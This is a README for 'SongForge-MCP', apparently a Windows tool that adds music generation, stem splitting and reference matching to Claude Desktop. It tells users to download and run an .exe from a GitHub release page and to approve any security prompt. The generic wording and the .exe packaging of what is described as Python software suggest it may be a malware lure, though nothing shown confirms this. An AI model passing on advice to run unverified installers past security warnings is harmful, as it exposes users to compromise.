# 🎵 SongForge-MCP - Create original music using Claude Desktop

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/unbrainwashed-physics713/SongForge-MCP/releases)

SongForge-MCP lets you generate professional music tracks directly inside the Claude Desktop application. You do not need to understand music theory, audio engineering, or machine learning to use this tool. The software handles the complex technical steps for you. It uses advanced AI to create songs, split sounds into individual parts like vocals and drums, and match the style of your favorite audio references.

## ⚙️ System Requirements

Before you begin, ensure your computer meets these basic requirements:

- Operating System: Windows 10 or Windows 11.
- Memory: At least 8GB of RAM.
- Storage: 2GB of available space for temporary files.
- Internet Connection: Required for downloading the model data and communicating with Claude.

## 💾 How to Install

You do not need to install complex programming tools. Follow these steps to set up the software on your Windows computer.

1. Visit the [official release page](https://github.com/unbrainwashed-physics713/SongForge-MCP/releases) to access the latest version of the application.
2. Locate the most recent release listed at the top of the page.
3. Click the file ending in `.exe` to start the download.
4. Once the download finishes, open the folder where you saved the file.
5. Double-click the installer file to begin the setup process.
6. Follow the instructions that appear on your screen.
7. Grant the installer permission to run if your computer displays a security prompt. The software uses the Model Context Protocol to link with Claude, which requires these specific permissions to function correctly.

## 🚀 Connecting to Claude

After the installation, you must point your Claude Desktop application toward SongForge-MCP. This process connects the music engine to your chat interface.

1. Open your Claude Desktop application.
2. Open the file named `claude_desktop_config.json` located in your hidden AppData folder. If you cannot find this, search for "Claude config file" in your Windows search bar.
3. Add the path to the SongForge-MCP application into the configuration file.
4. Save the file and restart your Claude Desktop application.
5. Look for the music icon or prompts in your chat window to confirm the connection.

## 🎧 Generating Your First Track

Once the setup is complete, you can start creating music by typing requests into your Claude session. You do not need technical knowledge. Focus on describing the sound you want.

Try typing a prompt like: "Create a soft piano track with a jazz influence." 

The system performs these actions automatically:
- It processes your request through the ACE-Step 1.5 engine.
- It generates the core audio components.
- It separates the output into stems, meaning it gives you distinct files for the vocals, percussion, and melody.
- It adjusts the composition based on your specific style instructions.

## 🔧 Troubleshooting

Most issues arise from missing permissions or path configuration errors. Follow these steps if the tool does not respond:

- Restart Claude: Closing and reopening the application often resolves integration errors.
- Check Config JSON: Ensure that the path you copied into your configuration file matches the exact location of your downloaded `.exe` file.
- Internet access: Ensure no firewall settings block the connection between your computer and the AI servers.
- Storage space: Clear your temporary folder if you receive errors about memory or file handling.

## ✨ Key Features

- AI Automation: The system manages all music theory and audio balancing tasks.
- Stem Splitting: You receive separate audio layers, which allows you to edit or mix parts later if you use other audio editing software.
- Reference Matching: Upload or describe existing music, and the software replicates the mood and tempo of your example.
- Local Integration: Data stays secure within your Claude Desktop environment.
- No Coding: The system runs entirely based on natural language commands. 

This software bridges the gap between complex generative AI and creative music production. By removing the need for professional studio equipment, it provides a direct path from an idea to a finished audio file. The use of the Model Context Protocol ensures that your communication with the AI remains fast and reliable, giving you a smooth experience during the creative process.

Keywords: ace-step, ai-music, anthropic, audio, claude, generative-ai, mcp, mcp-server, model-context-protocol, music, music-generation, python